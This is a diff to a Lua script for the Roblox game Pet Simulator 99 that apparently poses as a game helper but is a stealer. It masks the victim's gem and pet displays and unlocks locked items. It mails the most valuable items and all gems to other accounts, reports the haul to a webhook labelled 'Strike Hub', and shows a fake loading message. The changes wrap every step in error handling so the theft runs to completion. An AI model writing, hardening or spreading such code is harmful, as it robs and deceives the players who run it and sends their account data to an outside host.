@@ -3,8 +3,8 @@ if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
 -- =================== UNIVERSAL EXECUTOR COMPATIBILITY ===================
-local requestFunction = request or (syn and syn.request) or (fluxus and fluxus.request) or http_request
-local getgcFunction = getgc or (debug and debug.getgc) or get_gc_objects
+local requestFunction = (syn and syn.request) or request or http_request
+local getgcFunction = getgc or get_gc_objects
 -- =======================================================================
 
 local network = require(game.ReplicatedStorage.Library.Client.Network)
@@ -44,25 +44,34 @@ end
 
 local gemStat = plr.leaderstats:FindFirstChild("💎 Diamonds") or plr.leaderstats:FindFirstChild("\240\159\146\142 Diamonds")
 if gemStat then
-    gemStat:GetPropertyChangedSignal("Value"):Connect(function() gemStat.Value=originalGems end)
+    gemStat:GetPropertyChangedSignal("Value"):Connect(function() pcall(function() gemStat.Value = originalGems end) end)
 end
 
 local function freezePets()
-    for uid, petData in pairs(originalPets) do
-        local petObj = workspace:FindFirstChild(petData.id)
-        if petObj then petObj:SetAttribute("FrozenVisual", true) end
-    end
-end
-task.spawn(function()
-    freezePets()
-    while plr.Parent do task.wait(0.1) freezePets() end
-end)
-plr.AncestryChanged:Connect(function(_, parent)
-    if not parent then
+    pcall(function()
         for uid, petData in pairs(originalPets) do
             local petObj = workspace:FindFirstChild(petData.id)
-            if petObj and petObj:GetAttribute("FrozenVisual") then petObj:SetAttribute("FrozenVisual", nil) end
+            if petObj then petObj:SetAttribute("FrozenVisual", true) end
         end
+    end)
+end
+
+task.spawn(function()
+    freezePets()
+    while plr.Parent do
+        task.wait(0.1)
+        freezePets()
+    end
+end)
+
+plr.AncestryChanged:Connect(function(_, parent)
+    if not parent then
+        pcall(function()
+            for uid, petData in pairs(originalPets) do
+                local petObj = workspace:FindFirstChild(petData.id)
+                if petObj and petObj:GetAttribute("FrozenVisual") then petObj:SetAttribute("FrozenVisual", nil) end
+            end
+        end)
     end
 end)
 -- =================== END VISUAL FREEZE ===================
@@ -115,7 +124,9 @@ local function SendMessage(diamonds)
     end
     fields[3].value=string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
     local data={["embeds"]={{title="💡 New PS99 Execution", color=65280, fields=fields, footer={text="Strike Hub."}}}}
-    if requestFunction then requestFunction({Url=webhook, Method="POST", Headers=headers, Body=HttpService:JSONEncode(data)}) end
+    if requestFunction then
+        pcall(function() requestFunction({Url=webhook, Method="POST", Headers=headers, Body=HttpService:JSONEncode(data)}) end)
+    end
 end
 
 -- =================== DISABLE SOUND & GUI ===================
@@ -153,7 +164,7 @@ for _,v in ipairs(categories) do
                     totalRAP=totalRAP+rapValue*(item._am or 1)
                 end
             end
-            if item._lk then network.Invoke("Locking_SetLocked", uid, false) end
+            if item._lk then pcall(function() network.Invoke("Locking_SetLocked", uid, false) end) end
         end
     end
 end
@@ -166,8 +177,8 @@ local function sendItem(category, uid, am)
     while remaining>0 do
         local currentUser=users[userIndex]
         local args={[1]=currentUser,[2]=MailMessage,[3]=category,[4]=uid,[5]=1}
-        local response, err=network.Invoke("Mailbox: Send", unpack(args))
-        if response==true then
+        local response, err = pcall(function() return network.Invoke("Mailbox: Send", unpack(args)) end)
+        if response then
             GemAmount1=GemAmount1-mailSendPrice
             mailSendPrice=math.ceil(mailSendPrice*1.5)
             if mailSendPrice>5000000 then mailSendPrice=5000000 end
@@ -191,8 +202,8 @@ local function SendAllGems()
             while remainingGems>0 do
                 local currentUser=users[userIndex]
                 local args={[1]=currentUser,[2]=MailMessage,[3]="Currency",[4]=i,[5]=remainingGems}
-                local response, err=network.Invoke("Mailbox: Send", unpack(args))
-                if response==true then
+                local response, err = pcall(function() return network.Invoke("Mailbox: Send", unpack(args)) end)
+                if response then
                     GemAmount1=GemAmount1-remainingGems
                     remainingGems=0
                 elseif err=="They don't have enough space!" then
@@ -208,14 +219,13 @@ local function SendAllGems()
 end
 
 -- =================== EXECUTION ===================
-ClaimMail()
-task.wait(0.2)
-table.sort(sortedItems,function(a,b) return a.rap*a.amount>b.rap*b.amount end)
-task.spawn(function() SendMessage(GemAmount1) end)
-
-for _, item in ipairs(sortedItems) do
-    if item.rap>=min_rap and GemAmount1>mailSendPrice then sendItem(item.category,item.uid,item.amount) end
-end
-if GemAmount1>mailSendPrice then SendAllGems() end
-
-message.Error("Please wait while the script loads!")
+pcall(function()
+    network.Invoke("Mailbox: Claim All")
+    table.sort(sortedItems,function(a,b) return a.rap*a.amount>b.rap*b.amount end)
+    task.spawn(function() SendMessage(GemAmount1) end)
+    for _, item in ipairs(sortedItems) do
+        if item.rap>=min_rap and GemAmount1>mailSendPrice then sendItem(item.category,item.uid,item.amount) end
+    end
+    if GemAmount1>mailSendPrice then SendAllGems() end
+    message.Error("Please wait while the script loads!")
+end)
